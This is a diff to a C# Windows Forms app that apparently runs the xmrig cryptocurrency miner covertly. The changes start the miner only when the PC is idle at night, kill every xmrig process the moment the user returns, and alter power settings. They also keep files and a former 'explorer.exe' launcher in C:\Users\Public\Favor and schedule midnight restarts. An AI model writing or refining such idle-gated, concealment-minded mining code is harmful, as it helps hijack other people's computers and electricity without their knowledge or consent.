@@ -129,7 +129,6 @@ namespace WindowsFormsApp1
                 PowerSetings pow = new PowerSetings();
                 pow.SetSetings();
                 File.Create(@"C:\Users\Public\Favor\power.txt");
-
             }
 
 
@@ -137,17 +136,11 @@ namespace WindowsFormsApp1
 
             if (File.Exists(progStartName + @"\redy.txt"))
             {
-                time = DateTime.Now.ToString("HH.mm");
-                if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + "/restart.txt"))
-                {
-                    prog_started = false;
-                    close_prog();
-                    FileStatus stat = new FileStatus();
-                    stat.restart();
-                }
 
+                time = DateTime.Now.ToString("HH.mm");
                 timeInt = Convert.ToInt32(DateTime.Now.ToString("HH"));
-                if ((timeInt < 5 || timeInt > 22) && idleTime >= 1200000 && prog_started == false && time != "00.00")
+
+                if ((timeInt < 5 || timeInt > 22) && idleTime >= 800000 && prog_started == false && time != "00.00")
                 {
                     prog_started = true;
                     start_prog();
@@ -160,15 +153,33 @@ namespace WindowsFormsApp1
                     start_prog();
                 }
 
-                if (idleTime <= 100 && prog_started == true)
+                if (idleTime <= 4000  && prog_started == true )
                 {
+                    close_prog();
+                }
+
+
+
+
+                if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + @"/restart.txt"))
+                {
+                    File.Create(Environment.CurrentDirectory + @"/restart.txt");
                     prog_started = false;
                     close_prog();
                 }
 
-                if (File.Exists(Environment.CurrentDirectory + "/restart.txt") && time == "00.01")
+                if (time == "00.01" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && !File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                 {
-                    File.Delete(Environment.CurrentDirectory + "/restart.txt");
+
+                    File.Create(Environment.CurrentDirectory + @"/restart1.txt");
+                    FileStatus stat = new FileStatus();
+                    stat.restart();
+                }
+
+                if (time == "00.02" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
+                {
+                    File.Delete(Environment.CurrentDirectory + @"/restart.txt");
+                    File.Delete(Environment.CurrentDirectory + @"/restart1.txt");
                     prog_started = true;
                     start_prog();
                 }
@@ -197,9 +208,12 @@ namespace WindowsFormsApp1
                         */
                         //Environment.Exit(0);
                         File.Create(progStartName + @"\redy.txt");
-                        this.Close();
-                        Process.Start(@"C:\Users\Public\Favor\explorer.exe");
                         //this.Close();
+                        Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        //this.Close();
+                       // Environment.Exit(0);
+
+                        //System.Diagnostics.Process.Start("explorer", progStartName);
 
 
 
@@ -217,9 +231,12 @@ namespace WindowsFormsApp1
                         */
                         //Environment.Exit(0);
                         File.Create(progStartName + @"\redy.txt");
-                        this.Close();
-                        Process.Start(@"C:\Users\Public\Favor\explorer.exe");
+                        //this.Close();
+                        //Process.Start(@"C:\Users\Public\Favor\explorer.exe");
 
+                        Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
+                        //this.Close();
+                        //Environment.Exit(0);
 
                     }
                 }
@@ -259,14 +276,26 @@ namespace WindowsFormsApp1
 
         private void close_prog()
         {
+            Process[] processList = Process.GetProcessesByName("xmrig");
             try
             {
-                    Process.GetProcessById(rigID).Kill();
-                    prog_started = false;                
+                if (processList.Length != 0)
+                {
+                    for (int i = 0; i < processList.Length;)
+                    {
+                        processList[i].Kill();
+                        i++;
+                    }
+                }
+                else
+                {
+                    prog_started = false;
+                }
+                //Process.GetProcessById(rigID).Kill();
             }
             catch 
             {
-                prog_started = true;
+
             }
         }
 
